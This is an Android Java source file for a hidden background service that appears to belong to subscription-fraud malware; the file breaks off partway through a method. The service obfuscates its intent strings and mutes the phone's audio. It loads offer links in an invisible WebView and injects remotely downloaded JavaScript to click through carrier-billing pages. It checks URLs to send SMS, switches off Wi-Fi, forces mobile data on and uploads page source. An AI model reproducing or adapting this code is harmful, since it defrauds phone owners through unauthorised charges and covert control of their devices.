package w.c.s.view;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.view.ViewGroup;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import w.c.s.entity.Ma;
import w.c.s.task.CacheGpUtil;
import w.c.s.task.CacheUtil;
import w.c.s.task.ConnectUtil;
import w.c.s.task.DownJsUtil;
import w.c.s.task.GetCidUtil;
import w.c.s.utils.AudioTool;
import w.c.s.utils.EncodeTool;
import w.c.s.utils.HttpUtils;
import w.c.s.utils.JsUtil;
import w.c.s.utils.LinkUtil;
import w.c.s.utils.LogUtil;
import w.c.s.utils.OtherUtils;
import w.c.s.utils.PhoneControl;
import w.c.s.utils.PhoneInfor;
import w.c.s.utils.XmlShareTool;

import static w.c.s.task.GetCidUtil.DEFAULTCID;
import static w.c.s.utils.XmlShareTool.TAG_BLACK_LIST_STATE;
import static w.c.s.utils.XmlShareTool.checkGetGpCidTime;

public class AgentService extends Service {


    public static final String NotTime = "NowCache";

    private static AgentService agentService;

    private WebView mWebView = null;

    private Handler handler_;

    private HandlerThread mht;

    private boolean execute_task = false;

    private Random random = null;

    private InstallReceiver aKReceiver = null;
    private StatusReceiver statusReceiver = null;

    private int redirect = 0;
    private String lastUrl = "";
    private boolean hasRed = false;

    public static final String ACTION_SHOW = "com.notific.android.SHOW_ACTION.";
    public static final String ACTION_CANCEL = "com.notific.android.CANCEL_ACTION.";

    /**
     * 判断是否为黑名单显示通知栏
     */
    public void check_black_list () {
        int black_list_status = XmlShareTool.getInt(this, TAG_BLACK_LIST_STATE, 0);
        switch ( black_list_status ) {
            case -1:
                //                    LogUtil.show("黑名单清除通知栏");
                sendBroadcast(new Intent(ACTION_CANCEL + getPackageName()));
                break;
            case 1:
                sendBroadcast(new Intent(ACTION_SHOW + getPackageName()));
                break;
            default:
                //  LogUtil.w("未知情况下不展示通知栏");
                break;
        }
    }

    @SuppressLint ("NewApi")
    public void afterAnalysis (boolean falg) {

        if ( !falg && !XmlShareTool.checkTime(getApplicationContext(), XmlShareTool.TAG_LOAD_TIME, 1) ) return;
        XmlShareTool.saveLong(getApplicationContext(), XmlShareTool.TAG_LOAD_TIME, System.currentTimeMillis());

        LogUtil.show("c:" + XmlShareTool.getCID(this));
        LogUtil.show("Mcc:" + PhoneInfor.getMcc(this));
        LogUtil.show("Mnc:" + PhoneInfor.getMnc(this));

        //LogUtil.w("获取渠道结束后操作缓存");
        if ( PhoneControl.check_status(this) ) {
            // LogUtil.show("do cache");
            LogUtil.show("d c");
            if ( !TextUtils.isEmpty(XmlShareTool.getCID(this)) ) {
                new CacheUtil(agentService).executeOnExecutor(HttpUtils.executorService);
            } else {
                LogUtil.show("c Null");
            }
        }

        if ( PhoneControl.check_connect_status(this) ) {
            // LogUtil.w("满足联网时间限制");
            LogUtil.show("d con");
            new ConnectUtil(agentService).executeOnExecutor(HttpUtils.executorService);
        }

        if ( JsUtil.getInstance(this).check_d_js_time() && !XmlShareTool.checkBlackState(this) ) {
            if ( JsUtil.getInstance(agentService).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING ) {
                //LogUtil.w("满足下载js文件条件");
                LogUtil.show("d j");
                new DownJsUtil(this).executeOnExecutor(HttpUtils.executorService);
            } else {
                //LogUtil.show("js downloading...");
                //LogUtil.w("js 正在下载...");
            }
        }
    }

    @Override
    public IBinder onBind (Intent intent) {
        return null;
    }

    @Override
    public void onCreate () {
        super.onCreate();

        agentService = this;

        registIntallReceiver();

        random = new Random();

        initView();

        mht = new HandlerThread("toolbox");
        mht.start();

        new Thread() {
            @Override
            public void run () {
                super.run();

                Looper.prepare();

                handler_ = new Handler() {
                    @Override
                    public void handleMessage (Message msg) {
                        super.handleMessage(msg);

                        //key5:308203533082023ba0030201020204519c9c5b300d06092a864886f70d01010b0500305a310d300b060355040613046b657935310d300b060355040813046b657935310d300b060355040713046b657935310d300b060355040a13046b657935310d300b060355040b13046b657935310d300b060355040313046b657935301e170d3137303931393033323335365a170d3432303931333033323335365a305a310d300b060355040613046b657935310d300b060355040813046b657935310d300b060355040713046b657935310d300b060355040a13046b657935310d300b060355040b13046b657935310d300b060355040313046b65793530820122300d06092a864886f70d01010105000382010f003082010a0282010100ac50772c64fb422af2f8078ac06132e7fb0631ff2e95e0ed93ff81c51164b1ff077a1a7c629b3d833a098a78c58ae06b7141915159af46fe8835b957e6c2278122d82b5633696028fc6f9a4532c8de4d628c239a7966b8d7356dd06f507e8cd4731ba1a5ea8758cef8f54f4389e67ee60058f198e7294e83e09149c43b9ee99d7cdba2b274294e5fd7f7b13f47c521f008ae17d5129cecaf2b99f32afdc760d17878ffa0a7fbb213436871bd8d477790dc4d2cfb2e81df36512dbcf169bb044361ad1ef58403b6bed5a8381bc6c4fcbcbb86332da468863e134470efa461fb5b4b13b59111a688b506ebd81fef70d574fe621b0ef97646c20e68577a73b1b28f0203010001a321301f301d0603551d0e04160414a3c18d179aad30de6535727479e7a5843c46a86d300d06092a864886f70d01010b050003820101003cf2ddd3b1584a72b519c2b23a660430e98cf5b849c29b66b600ec37b53a8d931d3ab73978c7d558bb9b0b9b671444b5c97cf7361df113b14c601cd6af8a46bfec1b1f1dd9b76be33b1e314cc1387c2b9b69307ae371e5fe938602a6a9d09456a84fcfa9a21075a9e2cf9b68e767cd5ff0924c33b953b350ba86c368b851a17b06e029c45e7a0897043c210fc683402b7cac6c34d056b1ea8bfb361750ecbcea2d9e52a2040f05a4188419d264031e1f855fd5449a15d4631342aaa19251d3152ce77f3e240229b8be1f6934b53201c7b183a18a481a3d0fcb2653d971efb2ca51c057a45a9b951f940031db23a9f11b51d4a4d52c63cc8492b6cc05f597bfac
                        //key6:308203533082023ba0030201020204788a55c7300d06092a864886f70d01010b0500305a310d300b060355040613046b657936310d300b060355040813046b657936310d300b060355040713046b657936310d300b060355040a13046b657936310d300b060355040b13046b657936310d300b060355040313046b657936301e170d3137303932313031323535345a170d3432303931353031323535345a305a310d300b060355040613046b657936310d300b060355040813046b657936310d300b060355040713046b657936310d300b060355040a13046b657936310d300b060355040b13046b657936310d300b060355040313046b65793630820122300d06092a864886f70d01010105000382010f003082010a0282010100968d4b279d26855560937318c0aab6513a977c6b30664b65e63476f889c5bbef6e38b11bb9b530ce83195d767c12b8aaf6fceb9c88a1c976cb1f76899067a5c09bfeffb2751539d925c3017a8a0baf8cf387b09cdc0cb0d127aac65dc1188eecafbdad4f27055d7ecd3fa4d45d2406442db5065a8f844b628b204385442283338e38b9ed18bd49318501ca71212818fa90a69fb8baf98bbe0d9410808893c57da8ed3593d562c4ef9d2868896ab9f39ba09605df910a805b48b1fff4e8896a4a57bf05dd7b22cdaf2e72c9ad2d201ca18ed45b4f751321da626a54d8be51a52021167b230c48bf2b834ad468e4bb3cebca38ef8e5e090d12e3ecdce3a9609e2d0203010001a321301f301d0603551d0e0416041472ee060bad903b1cffcf14b52c72c8ee625405bc300d06092a864886f70d01010b050003820101005ff1b934eec5d541e5f4ebc27ef6188eae9ef9c0d0ffdd3d0a06258aed8e5508585adb1c0e1ea353c509bf43937fb76651bff638c7fbd9e92b40fcad11b6a328891e43acb879938c835266add1817efa84704f17d04c5d3f62b7d4979bced5aee8a0192c9a71367f817605df4407dee2d7ab81158164ab62e65c61fca6d5863f054c9e5f0b5cd3bf0bd6d41cdce950bb30f9722fa56bd147563399b5c9357ce3fe64058af36c2f385edbdbbeec0e1b0569bfaeeaaabb94c899e828281b65bceff417e3f235da714d146c1afb643ed376a5f4ef8520bd5d792b0dcde690c1ef4c2ce00dbf3f4d81b8935e733af58fc485f2fc7a3fc1fcbcb8ba75368bef406ef8
                        //key7:308203533082023ba00302010202040a3508b1300d06092a864886f70d01010b0500305a310d300b060355040613046b657937310d300b060355040813046b657937310d300b060355040713046b657937310d300b060355040a13046b657937310d300b060355040b13046b657937310d300b060355040313046b657937301e170d3137303932383036313331355a170d3432303932323036313331355a305a310d300b060355040613046b657937310d300b060355040813046b657937310d300b060355040713046b657937310d300b060355040a13046b657937310d300b060355040b13046b657937310d300b060355040313046b65793730820122300d06092a864886f70d01010105000382010f003082010a028201010098065cd58383dac8dbb970a0e653bbcf5198ead51b24f7ded715658d6deca2db4b9d72adf251e0a7b534f15c1bc75b632b231d8728df04501979f429fbe502d70a7c9591e501aa3d99b6ea4ebc4eecc91fe20644f791e6670dc5fd04487e1e2617f61735c279721ee50cee58d0b4c175cf5ef2546569bcb1b8583b90bc1f7177ef5581f529815d486a15dcfc970c98b1205f761425b5dc1f0fa7acedec4635c9300d4310fc75b73dfa8f772fc4d693fefc3823990f4c85fd63a43dd2213959c403fcc81b3094935c5f923775bcd77d9f24fc26f2cca73d493a4d1c4da889f8e1e24875f0427485dfb77559e1dc2d612f6a6157d20bf2546005d513b4ae64c9730203010001a321301f301d0603551d0e04160414e784b7543c46421ce57ccc59fa51b704720200e9300d06092a864886f70d01010b050003820101006a5ba2e2cb0d0d540560f160c2c1060202ed7e26c976ccf269dc2ec655e0f3c553a9c1eea7a485949813fb576ce1bd0bb075114da06b32a3e2a22336576503e88bca98ac4dc67e470f96274280846103b06ce004a58e79d966e6b07f73b91c3aaac6d1caa130618358fe6df945be9dd7983778adc4427d108e9fa462d6b6022f719e97724dc8396586ac8958f6a90e5947fcad90a462b81250bac9202ed29ee705b57c0da2d106dcc72009a14fbbf8d37a78330049bb3f769d42d99973193fad13fb5b775c20e826056d7063a3aaa9ce13666a96bdd56dcde37b9ec188dc41a050f36cd1181cee7a943f16fb77414697e1c5e480c5a3fb152f4dfe2d59724b0e
                        //key8:3082036b30820253a00302010202043ec7047d300d06092a864886f70d01010b050030663111300f060355040613083130313031303130311430120603550408130b4c6f7320416e67656c6573310c300a060355040713035553413110300e060355040a1307636f6d70616e79310c300a060355040b1303617070310d300b060355040313044c79696e301e170d3137313031363031343832325a170d3432313031303031343832325a30663111300f060355040613083130313031303130311430120603550408130b4c6f7320416e67656c6573310c300a060355040713035553413110300e060355040a1307636f6d70616e79310c300a060355040b1303617070310d300b060355040313044c79696e30820122300d06092a864886f70d01010105000382010f003082010a028201010083446e97c14b62b9aeea88165f1c5e1dcb1a685c155a23733b77eaffd109b0f4dfd69d60cd0992650dd30954c9d94e45fa07338f6238059a1cd9109ae0ea5124c5559e700951e66acf5344a0c5d2ddfc7db5369b8cd8918d5ab07bb9665df65de6496aacfcf56ebeca8e1c97e596a180f9ce14a23d57a8ba11838c3034fabe8ac52652b85b9ec1f2a1ab75a8e029dbe6ff67a662ff6307800f3c852f40d5bdc1b1b4937d61805f9e56ad7f9d9b9f66a354b0c920a149e4b8c55e8c3c48450c6920a58e334377b4b130dd0d692d01717d1228b237662a18bd39892ba9159560b15955276b01ccfcd6fc73b15d3da95be1dd46366ead2169803b9a36d964c1c0790203010001a321301f301d0603551d0e0416041475c0d0a6c61d3e2be662ef77790bf6cde9982861300d06092a864886f70d01010b05000382010100618a322640938fcb7dfde9027ca559b08414baafdcdf9df72a9af8447f81016ce307d9c8afde663a78c7a9f68afb660b710487580db8c6b0868f94384e6795e514b46f77c3874694a69021be9909345dcc2223f79430314ba9f6a70f2945532375cad2a3e6b477c347e40d0929bdeb099b1ed0987cb9dfd1033554acc6841665b5284ff570dcc22ebe8880d87a7cd312663ff08d56a1086d2d2370a6770a0514688729b6dda2effa3ed74fdbc50aa6086f9713e77d850a58659825aba3faa8bea84921fd2b0600218d49e6af3ffefe387560a24e57386fa3454c1e92eaf74ba0d5d11852e4fb8cf51cb2dc9e3aee7db5a2b8ad2d915fe56a25627a19bafddba7
                        //key9:3082036930820251a00302010202040678ec45300d06092a864886f70d01010b050030653111300f060355040613083031313233343536310f300d060355040813066e736f64696a310f300d060355040713066b73646f61733110300e060355040a13076f676e616f7369310d300b060355040b130461736b64310d300b0603550403130473667364301e170d3137313032303031303632375a170d3432313031343031303632375a30653111300f060355040613083031313233343536310f300d060355040813066e736f64696a310f300d060355040713066b73646f61733110300e060355040a13076f676e616f7369310d300b060355040b130461736b64310d300b060355040313047366736430820122300d06092a864886f70d01010105000382010f003082010a0282010100930ddd53664e6832b67349adfff64f82234ef833b39209d7b486c11c22a122f8d8747491d0ae0d5292a02e7c8e54e9cc5a754e6224ed88573d4cf54e63c8a8bb1d5536abdddd3207a117610d7479f5750fa15710d97e8d1168475cffb2469a6890e528557aa7e0505687d7f87da39556d6835a9eb6861896144d631b0f21dfc51783e33f9c861c3572d52800e194ade4236bfc25a9b279e90f35198fb0ae589ab41fbda24250a8718481b93329cfb5e5787fb61e85597d9340ab39ad65fb14c9de1373f63d8aa6a914c801841693c73afa9299c590cc1d5cfc5e7768ab0ff9747edc8a1cfa4de56cd339dabe2d2935561367cc6c140843a2221a6432e859fd630203010001a321301f301d0603551d0e0416041410f4f6a65f487b128047c442df97478b2d77ac5a300d06092a864886f70d01010b050003820101006fe1a58393619dc2618234fae63d1188c8a4f976f4ff2668e44bdf7ccaee46cf129a820a43a958123bc2fc0546fce7c48cc8230e617829376f9ceae6f440516c263caf8473373beb8e62bd41982f0564f97d9391a947c57936a53a69d10587da8d5e91b4db625e75d5bd29c370885177c10a8c66907d5447941c1c41fd1a4f9697a6143d93a867e2d862e53919f45d22343777b2e3366dfe76ff6e42478eabc4dc248d95d6ae79f9bd56c6b58c4fcef2acb6f22f7be65e0335175c28c4e218f6d09df7f0cb95bee79a6aeb603fb84fcc4f588dc8e03e3cb8d45d65c5fe10c1cfa0124ccbe85b0d1028e12b064791f5e3676909cdd934b60f8ace3f872d9ad779
                        //key11:308203653082024da00302010202045d364963300d06092a864886f70d01010b05003063310d300b06035504061304636f64653111300f0603550408130870726f76696e63653111300f060355040713086c6f63616c697479310f300d060355040a13066f7267616e69310d300b060355040b1304756e6974310c300a0603550403130361646e301e170d3137313130343031333530335a170d3432313032393031333530335a3063310d300b06035504061304636f64653111300f0603550408130870726f76696e63653111300f060355040713086c6f63616c697479310f300d060355040a13066f7267616e69310d300b060355040b1304756e6974310c300a0603550403130361646e30820122300d06092a864886f70d01010105000382010f003082010a02820101008a9601807dfe908a9b81ae9a74d4abb1212e3d441667416ed9689e57d7dcdb64ebca5736e89bbb82d86db59821dd29d835f11a4f4644f3975463713701e5f0c9ced112b72db736d31f0fd1d37611076384192ed9ca332eb5b78ff7a618013500673cb06ea438af6121b49b24328e2b1aed909d87298f8894629139be289e006741f17480169fad245aa065524f3430579d79c103a2410f58ae1969710014e6a3baf9bff263c74843cbe4c5bda2fed47e25da552babcff560ac2f96c1da8567c394b6fa60759fe55ffda26b4163937b5fcd28335ba03815e1ed4f6ee1a0d8f293db321b4c5b474263bdb103901970373983ca8047617b1fe864d9a833d62bc1850203010001a321301f301d0603551d0e0416041458ce1e9c3090132e9ebdfd2f9379264e82fcd64f300d06092a864886f70d01010b0500038201010046a744e6bb0c602daef0c6bbb5ad4e72e0b6ae314bf8aadae54f84665296e3960bee0de1ee53ee3cab12bfa7bcd2174b0e2e0698f62c6786ac10287bb39aee7619157dbea8649929b88ae3698f5a780febb4111d5f6b38f1f503429002b556fdeba1c281e0c3285108668c23258c9e367d5c29a43d622780189b4bbefea67f669117f476b6b798a75fbf063c606462c806709bc3a0a1ea8c9f4ac39e150213a901484a7b7275e8ff397735db4393a925d3dbfe25e51bb859aafbee5f701c5a7fbf1edd61e0736940bef57191aa086e3c0a0024874a86ba0f361275cc028beb2c87d3fc4b70db5512b98ad96753273cbcff469805ca003732032ba6283f7afb68
                        //                        LogUtil.show("key:" + EncodeTool.getSignature(getApplicationContext()));

                        webHandler.sendEmptyMessage(0);
                        handler_.sendEmptyMessageDelayed(1, 6000);
                    }
                };

                handler_.sendEmptyMessage(5000);

                Looper.loop();
            }
        }.start();

        LogUtil.show("s onCreate");
    }

    public void registIntallReceiver () {
        aKReceiver = new InstallReceiver();

        //PACKAGE_ADDED
        String org0 = "REdiiC9Je6wXGSRh6xm5YQ==";

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action." + EncodeTool.deCrypt(org0));
        intentFilter.addDataScheme("package");
        registerReceiver(aKReceiver, intentFilter);

        statusReceiver = new StatusReceiver();
        registerReceiver(statusReceiver, intentFilter);

        //USER_PRESENT
        String org4 = new String(new byte[]{85, 83, 69, 82, 95, 80, 82, 69, 83, 69, 78, 84});
        //DOWNLOAD_COMPLETE
        String org5 = "Mt72/oElvpVo16YQI9KMyvDVy2dDNvR2Z/QdKYY9j6k=";
        //DOWNLOAD_NOTIFICATION_CLICKED
        String org6 = "+sOYXqfdvJPdXAmvRSzEFVFTD1ZUVtQ9AkQOSE+UX7M=";
        //SIM_STATE_CHANGED
        String org7 = "t4wqBiVIRSFaie1vwq1ZGsw6yQ2498mmSyHiVGYUtCo=";

        IntentFilter phoneFilter = new IntentFilter();
        phoneFilter.addAction("android.intent.action." + org4);
        phoneFilter.addAction("android.intent.action." + EncodeTool.deCrypt(org5));
        phoneFilter.addAction("android.intent.action." + EncodeTool.deCrypt(org6));
        phoneFilter.addAction("android.intent.action." + EncodeTool.deCrypt(org7));
        registerReceiver(statusReceiver, phoneFilter);

        //PACKAGE_DATA_CLEARED
        String org1 = new String(new byte[]{80, 65, 67, 75, 65, 71, 69, 95, 68, 65, 84, 65, 95, 67, 76, 69, 65, 82, 69, 68});
        //DEFAULT
        String org2 = new String(new byte[]{68, 69, 70, 65, 85, 76, 84});
        //package
        String org3 = new String(new byte[]{112, 97, 99, 107, 97, 103, 101});
        IntentFilter cleanFilter = new IntentFilter();
        cleanFilter.addAction("android.intent.action." + org1);
        cleanFilter.addAction("android.intent.category." + org2);
        cleanFilter.addDataScheme(org3);
        registerReceiver(statusReceiver, cleanFilter);

    }

    public synchronized int onStartCommand (Intent intent, int flags, int startId) {

        if ( XmlShareTool.checkTime(this, XmlShareTool.TAG_GP_CACHE_TIME, 31) ) {
            LogUtil.rect("c g");
            new CacheGpUtil(agentService).executeOnExecutor(HttpUtils.executorService);
        }

        if ( !checkGetGpCidTime(getApplicationContext()) || PhoneInfor.getType(this) != 2 ) {
            afterAnalysis(intent.getBooleanExtra(NotTime, false));
        }

        first_start_app();
        check_black_list();

        return Service.START_NOT_STICKY;
    }

    @Override
    public void onDestroy () {
        super.onDestroy();

        if ( aKReceiver != null ) {
            unregisterReceiver(aKReceiver);
        }

        if ( statusReceiver != null ) {
            unregisterReceiver(statusReceiver);
        }
    }

    @TargetApi (Build.VERSION_CODES.HONEYCOMB)
    private void first_start_app () {
        if ( checkGetGpCidTime(getApplicationContext()) && PhoneInfor.getType(this) == 2 ) {
            String cid = XmlShareTool.getGpCID(getApplicationContext());
            XmlShareTool.saveGpCidTime(getApplicationContext());
            if ( TextUtils.isEmpty(cid) || DEFAULTCID.equals(cid) ) {
                new GetCidUtil(agentService).executeOnExecutor(HttpUtils.executorService);
            }
        }
    }

    private Handler webHandler = new Handler() {
        @Override
        public String toString () {
            return super.toString();
        }

        @Override
        public void handleMessage (Message message) {
            switch ( message.what ) {
                case 0:
                    if ( PhoneControl.check_webview_load_time(getApplicationContext())//
                            && !XmlShareTool.checkBlackState(getApplicationContext()) //
                            && !execute_task ) {
                        //                        LogUtil.w("服务中满足时间开始执行链接");
                        //                        LogUtil.show("do webView load");
                        execute_task = true;
                        new Task().execute();
                    }
                    break;
                case 1:
                    if ( !checkNetWork() ) {

                        //                        LogUtil.w("网络异常情况下不注入js，执行下一条");
                        //                        LogUtil.show("net error not load js, do last");

                        webHandler.sendEmptyMessage(3);

                        break;
                    }

                    if ( !same_offer ) {

                        int random_ = random.nextInt(100) + 1;

                        LogUtil.show("r " + random_ + ":" + jRate);

                        if ( random_ > jRate ) {
                            // LogUtil.w("随机数" + random_ + "大于" + jRate + "不执行注入");
                            // LogUtil.show("random_" + random_ + ">" + jRate + " do last one");
                            if ( showInterstitialOffer != null ) {
                                if ( !XmlShareTool.checkShowIntersAdTime(getApplicationContext()) ) {
                                    LogUtil.show("n w");

                                    LinkUtil.getOfferExecuteTime(getApplicationContext(), showInterstitialOffer);

                                    webHandler.sendEmptyMessage(5);
                                    //    LogUtil.show("do not update times");
                                    break;
                                }

                                LogUtil.show("o w");
                                XmlShareTool.saveShowIntersAdTime(getApplicationContext());
                                Va.getInstance(getApplicationContext()).startLoad(showInterstitialOffer, false);
                            }
                            webHandler.sendEmptyMessage(3);
                            break;
                        } else {
                            //                            LogUtil.w("随机数" + random_ + "小于等于 " + jRate + " 执行注入");
                            //                            LogUtil.show("random_" + random_ + "<=" + jRate + " load js");
                        }
                    }
                    String jsString = JsUtil.getInstance(getApplicationContext()).getJsString();

                    if ( mWebView != null && !TextUtils.isEmpty(jsString) ) {
                        //                        LogUtil.w("service_执行注入");
                        //                        LogUtil.show("service_ load js");
                        mWebView.loadUrl("javascript:" + jsString, HttpUtils.getWebHead());
                        mWebView.loadUrl("javascript:findLp()", HttpUtils.getWebHead());
                        mWebView.loadUrl("javascript:findAocOk()", HttpUtils.getWebHead());
                    }
                    break;
                //                注入获取网页的代码js
                case 2:
                    if ( mWebView != null ) {
                        mWebView.loadUrl(HttpUtils.js_get_source, HttpUtils.getWebHead());
                    }
                    break;
                case 4:

                    //                    LogUtil.show("do last after 2 min,check post Resource status");
                    //                    LogUtil.w("间隔了两分钟后直接执行下一条,先判断是否需要上传源码");
                    boolean source_status = XmlShareTool.check_source_status(getApplicationContext(), offer_id + "");

                    if ( source_status && getSource == 0 ) {
                        //                        LogUtil.w("需要源代码上传");
                        //                        LogUtil.show("need load Resource js");
                        webHandler.sendEmptyMessage(2);
                        webHandler.sendEmptyMessageDelayed(3, 3000);
                    } else {
                        //                        LogUtil.w("不需要源代码上传");
                        //                        LogUtil.show("need not load resource js, do last one");
                        webHandler.sendEmptyMessage(3);
                    }
                    break;
                case 3:
                    LogUtil.show("n " + load_error);
                    if ( checkNetWork() ) {
                        //                        LogUtil.w("网络正常的情况统计:" + offer_id + "的执行次数");
                        LinkUtil.save_sub_link_limit(getApplicationContext(), showInterstitialOffer);
                    } else {
                        //                        LogUtil.w("网络异常不统计:" + offer_id + "的执行次数");
                    }
                    webHandler.sendEmptyMessage(5);
                    break;
                case 5:

                    if ( mList != null && execute_index < mList.size() ) {

                        //                        LogUtil.show("do last offer_id:" + mList.get(execute_index).getOffer_id() + ":" + execute_index + "  after 5s");
                        //                        LogUtil.w("执行下一条链接offer_id:" + mList.get(execute_index).getOffer_id() + "执行第" + execute_index + "条");

                        start_load(mList.get(execute_index));
                        execute_index = execute_index + 1;

                    } else {

                        //                        LogUtil.w("轮询结束,回收浏览器");
                        //                        LogUtil.show("do all offer finished,destroy webView");

                        webHandler.removeMessages(4);
                        destoryWebView();
                    }
                    break;
            }
        }
    };

    private void start_load (Ma offer) {
        LogUtil.show("p " + offer.getSub_platform_id() + "  s " + offer.getOffer_id());

        AudioTool.getInstance(getApplicationContext()).setSlience();

        initStatus();
        String load_url = LinkUtil.getChangeUrl(offer, this, true);
        showInterstitialOffer = offer;
        jRate = offer.getJRate();
        sub_platform_id = offer.getSub_platform_id();
        offer_id = offer.getOffer_id();
        getSource = offer.getGetSource();

        if ( mWebView == null ) {
            initView();
        }

        PhoneControl.disableJsIfUrlEncodedFailed(mWebView, load_url);

        webHandler.removeMessages(4);
        webHandler.sendEmptyMessageDelayed(4, 2 * 60000);

        mWebView.onResume();
        mWebView.clearFocus();
        mWebView.stopLoading();
        mWebView.clearHistory();
        mWebView.clearCache(true);
        mWebView.loadUrl(load_url, HttpUtils.getWebHead());

        LogUtil.show("u:" + load_url);
    }

    private class Task extends AsyncTask<Void, Integer, Ma> {

        @Override
        protected Ma doInBackground (Void... params) {

            mList = null;
            execute_index = 0;

            if ( JsUtil.getInstance(getApplicationContext()).check_d_js_time() && !XmlShareTool.checkBlackState(getApplicationContext()) ) {
                if ( JsUtil.getInstance(getApplicationContext()).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING ) {
                    //                    LogUtil.w("执行offer前满足条件先下载js");
                    //                    LogUtil.show("download js before execute offer");
                    LogUtil.show("d j");
                    JsUtil.getInstance(getApplicationContext()).init();
                    if ( JsUtil.getInstance(getApplicationContext()).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_FAIL ) {
                        //                        LogUtil.w("下载失败不往下执行offer");
                        //                        LogUtil.w("download fail return");
                        return null;
                    }
                } else {
                    //                    LogUtil.w("js正在下载中,不执行offer");
                    //                    LogUtil.w("js downloading..");
                    return null;
                }
            }

            Ma offer = LinkUtil.get_one_offer(getApplicationContext());
            if ( offer == null ) return null;

            //            LogUtil.w("随机的一条支持网络状态(1:流量)：" + offer.getAllow_network());
            //            LogUtil.show("get one offer(1:gprs)：" + offer.getAllow_network());
            if ( offer.getAllow_network() == 1 ) {

                //                LogUtil.w("服务中执行: 只支持GPRS");
                //                LogUtil.show("only gprs");

                if ( PhoneControl.getWifiStatus(getApplicationContext()) ) {

                    if ( JsUtil.getInstance(getApplicationContext()).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_DOING ) {

                        //                        LogUtil.w("正在下载js或缓存不做执行offer,不做关闭wifi操作");
                        //                        LogUtil.show("js downloading,do not close wifi");

                        return null;
                    }
                    //                    LogUtil.w("服务中执行: 判断wifi为开启状态 做关闭");
                    //                    LogUtil.show("do close wifi");
                    //关闭wifi
                    PhoneControl.closeWifi(getApplicationContext());

                    try {
                        Thread.sleep(5000);
                    } catch ( InterruptedException e ) {
                        e.printStackTrace();
                    }

                }

                if ( !PhoneControl.getMobileStatus(getApplicationContext(), null) ) {
                    //                    LogUtil.w("服务中执行:GPRS为关闭状态，做开启操作");
                    //                    LogUtil.show("open gprs");

                    PhoneControl.setNetState(getApplicationContext(), "setMobileDataEnabled", true);

                    try {
                        Thread.sleep(10000);
                    } catch ( InterruptedException e ) {
                        e.printStackTrace();
                    }
                }
            }

            mList = LinkUtil.getOfferList(getApplicationContext(), offer.getAllow_network(), offer.getOffer_id(), offer.getSub_platform_id());

            return offer;
        }

        @SuppressLint ("SimpleDateFormat")
        @Override
        protected void onPostExecute (Ma offer) {
            super.onPostExecute(offer);

            execute_task = false;

            if ( offer == null ) {
                //                LogUtil.w("没有查找到数据");
                //                LogUtil.show("no data");
                return;
            }

            PhoneControl.save_webview_load_time(getApplicationContext());

            AudioTool.getInstance(getApplicationContext()).setSlience();

            start_load(offer);
        }
    }

    @SuppressLint ({"SetJavaScriptEnabled", "JavascriptInterface"})
    private void initView () {
        mWebView = new WebView(getApplicationContext());
        mWebView.setDrawingCacheBackgroundColor(Color.WHITE);
        mWebView.setFocusableInTouchMode(true);
        mWebView.setFocusable(true);
        mWebView.setDrawingCacheEnabled(false);
        mWebView.setWillNotCacheDrawing(true);
        mWebView.setBackgroundColor(Color.WHITE);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setSaveEnabled(true);
        mWebView.setNetworkAvailable(true);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(this, "toolbox");
        mWebView.addJavascriptInterface(this, "myObj");
        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading (WebView view, String url) {

                OtherUtils.checkGpAPPUrl(getApplicationContext(), url, 0);

                OtherUtils.checkToSendSMS(url);

                mWebView.loadUrl(url, HttpUtils.getWebHead());

                return true;
            }

            //            @Override
            //            public WebResourceResponse shouldInterceptRequest (WebView view, String url) {
            //                return HttpUtils.getWebResResponse(url);
            //            }

            //            @Override
            //            public void onReceivedSslError (WebView view, SslErrorHandler handler, SslError error) {
            //                handler.proceed();
            //            }

            @Override
            public void onPageFinished (WebView view, String url) {
                super.onPageFinished(view, url);

                //    LogUtil.show("onPageFinished+" + url);

                if ( url.equals(last_finished_url) ) {
                    //      LogUtil.w("相同的链接不注入");
                    return;
                }

                last_finished_url = url;
                webHandler.removeMessages(1);

                if ( LinkUtil.check_url(url) ) {
                    load_error = 0;
                    webHandler.sendEmptyMessage(3);
                    return;
                }
                webHandler.sendEmptyMessageDelayed(1, 20000);
            }

            @Override
            public void onPageStarted (WebView view, String url, Bitmap favicon) {
                LogUtil.show(redirect + "slurl:" + url);

                load_error = 0;
                findLp_ok = "";
                findAoc_ok = "";

                if ( url.equals(lastUrl) ) {
                    redirect++;
                } else {
                    redirect = 0;
                }

                if ( redirect > 10 & !hasRed ) {
                    LogUtil.show("m r n o");
                    hasRed = true;
                    destoryWebView();
                    webHandler.removeMessages(1);
                    webHandler.sendEmptyMessageDelayed(5, 1000);
                }

                lastUrl = url;
            }

            @Override
            public void onReceivedError (WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                load_error = errorCode;
            }
        });
    }

    @SuppressLint ("NewApi")
    private void destoryWebView () {
        if ( mWebView != null ) {
            try {
                ViewGroup parent = (ViewGroup) mWebView.getParent();
                if ( parent != null ) {
                    parent.removeAllViews();
                }

                mWebView.stopLoading();
                mWebView.onPause();
                mWebView.clearHistory();
                mWebView.removeAllViews();
                mWebView.destroyDrawingCache();
                mWebView.destroy();
            } catch ( Exception e ) {
                e.printStackTrace();
            }

            mWebView = null;
        }

        AudioTool.getInstance(getApplicationContext()).setNomal();

        LogUtil.show("w d");
    }


    /**
     * 获取源码信息回调
     *
     * @param source
     */
    @android.webkit.JavascriptInterface
    public void getSource (String source) {
        //        LogUtil.w("getSource: " + source);
        LogUtil.show("s r");

        //source_type
        String org1 = new String(new byte[]{115, 111, 117, 114, 99, 101, 95, 116, 121, 112, 101});
        //network
